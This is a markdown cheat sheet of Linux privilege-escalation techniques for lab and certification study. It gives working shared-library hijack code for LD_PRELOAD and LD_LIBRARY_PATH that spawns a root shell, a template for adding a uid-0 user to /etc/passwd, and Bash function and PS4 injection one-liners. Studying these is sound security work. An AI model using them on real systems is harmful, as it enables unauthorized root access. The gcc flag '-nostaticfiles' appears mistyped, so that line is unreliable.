# Privesc

Privilege Escalation involves increasing permissions/rights on the target machine. 

This can be done by exploiting a vulnerability/misconfiguration on a system to gain unauthorized access to resources that are usually restricted from the users.

Being able to "prives" may allow you to:
- install malicious softwares, edit software configurations or more generally enable persistence via **backdoors** (such as in this [article](https://airman604.medium.com/9-ways-to-backdoor-a-linux-box-f5f83bae5a3c) or in this [example](https://0x90909090.blogspot.com/2016/06/creating-backdoor-in-pam-in-5-line-of.html))
- change passwords
- bypass access control or "pivot" (lateral movement)
- get `root.txt` flag :)

## Kernel Exploits

> [Dirty COW](https://dirtycow.ninja/) for example.

1. Enumerate kernel version (with `uname -a` for instance)
2. Look for matching exploit (`searchsploit`, Google, GitHub, etc.)

- [linux-exploit-suggester-2.pl](https://github.com/jondonas/linux-exploit-suggester-2)

## Read/write sensitive files

- If we can write into `/etc/passwd`, we can enter a know password for the **root** user or simply create a new user by:
    + computing a password hash: `openssl passwd -1 -salt [salt] [password]`
    + adding a new entry to `/etc/passwd`: `<USERNAME>:<HASH>:0:0:root:/root:/bin/bash` _(it will take precedent over the hash in `/etc/shadow`)_

> The "`x`" in the second field of this file instructs Linux to look for the password hash in `/etc/shadow`

> If there is no "`x`", Linux interprets it as the user having no password

- `/etc/shadow`:
    + if we're able to read its content, we might be able to crack passwords using `john` or `hashcat`
    + if we're able to modify it, we can replace the root user's password hash with one we know

- a user may have created insecure backups for sensitive files (ssh keys, `/etc/passwd`, etc.)

### Cron jobs

Cron jobs are programs that are run periodically and scheduled at specific times by users.

> By default, cron jobs are run with `/bin/sh` with limited environment variables.

System-wide crontab is located at `/etc/crontab`.

User crontabs are usually located in:
- `/var/spool/cron`
- `/var/spool/cron/crontabs`

- We can abuse the crontab `PATH` environment variable if no absolute path for a specific program is specified in `/etc/crontab`

- Beware of wildcards (`*`)

___

## `sudo` misconfiguration

> `/etc/sudoers`

- `sudo -l`: list programs a user is allowed to run
    + `NOPASSWD` (particularly interesting)

- `sudo -u <username> <program>`

### GTFOBins

[GTFOBins](https://gtfobins.github.io/) is a list of sequences to "escape" programs and (often) spawn a shell.

Some programs do not appear in this list but can be used to leak sensible information.

Example: `sudo apache2 -f /etc/passwd`

### Environment variables

- `LD_PRELOAD` allows us to load a shared object (`.so`) before any others.
    + if `LD_PRELOAD` is preserved via `env_keep` in `sudo` configuration, then we can create a custom `.so` in which we will place an `init()` function and then perform a privesc:

        ```c
        #include <stdio.h>    
        #include <sys/types.h>    
        #include <stdlib.h>

        void init() {
            unsetenv("LD_PRELOAD");
            setresuid(0,0,0);
            system("/bin/bash -p");
        }
        ```

        ```bash
        $ gcc -fPIC -shared -nostaticfiles preload.c -o /tmp/preload.so
        $ sudo LD_PRELOAD=/tmp/preload.so find
        ```

- `LD_LIBRARY_PATH` contains a set of directories where shared libraries are searched for first.
    + `ldd <program>` will print shared object dependencies used by a program
    + if `LD_LIBRARY_PATH` is preserved via `env_keep` in `sudo` configuration, we can create a shared library with the same name as one used by a program so that the program will load ours:
        
        ```c
        #include <stdio.h>    
        #include <stdlib.h>

        static void hijack() __attribute__((constructor));

        void hijack() {
            unsetenv("LD_LIBRARY_PATH");
            setresuid(0,0,0);
            system("/bin/bash -p");
        }
        ```

        ```bash
        $ ldd <program>
            ...
            libcrypt.so.1 => /lib/libcrypt.so.1
            ...
        $ gcc -fPIC -shared library_path.c -o /tmp/libcrypt.so.1
        $ sudo LD_LIBRARY_PATH=/tmp/ <program>
        ```

___

## SUID/SGID Files

A **SUID/SGID file** is a binary that can be executed with the permissions of the owner/group of the file.

- Finding SUID: `find / -perm -u=s -type f 2>/dev/null`
- Finding SGID: `find / -perm -g=s -type f 2>/dev/null`f

> Using `strace`, `ltrace`, `strings` on these binaries could help during the privesc process

- In Bash versions prior to 4.2-048 allows us to define Bash functions with forward slashes (`/`) in their names:

```bash
$ function /usr/sbin/service { /bin/bash -p; }
$ export -f /usr/sbin/service 
```

- In Bash versions prior to 4.4, the **PS4** environment variable is inherited by shells:

```bash
$ env -i SHELLOPTS=xtrace PS4='$(<payload>)' <program> 
```

___

## Plaintext passwords

- Looking at `*_history` files in home directories, plus configuration files

___

## Unsecure mounted directories

- NFS shares are configured in `/etc/exports`

    > By default, created files inherit the remote user’s id and group id (as owner and group respectively), even if they don’t exist on the NFS server.

    + `showmount -e <target`
        * `mount -o rw,vers=2 <target>:<share> <local_directory>`
            - `nfs-showmount` (`nmap`)
    + if `no_root_squash` option is enabled and the remote user is **root** (uid=0), created files inherit the remote user's id and group id.

___

## Useful links/tools

- [LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS#linpeas---linux-privilege-escalation-awesome-script)
- [LinEnum](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh)
- [GTFOBins](https://gtfobins.github.io/)
- [Linux Privilege Escalation Checklist](https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md)
- [PayloadsAllTheThings - Linux Privesc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#linux---privilege-escalation)
- [Total OSCP Guide - Linux Privesc](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html)
- [A guide to Linux Privilege Escalation](https://payatu.com/guide-linux-privilege-escalation)
- [Tib3rius - Linux Privilege Escalation for OSCP & Beyond!](https://www.udemy.com/course/linux-privilege-escalation/)
- [THM - Common Linux Privesc](https://tryhackme.com/room/commonlinuxprivesc)
- [THM - Linux PrivEsc Arena](https://tryhackme.com/room/linuxprivescarena)
- [THM - Linux PrivEsc](https://tryhackme.com/room/linuxprivesc)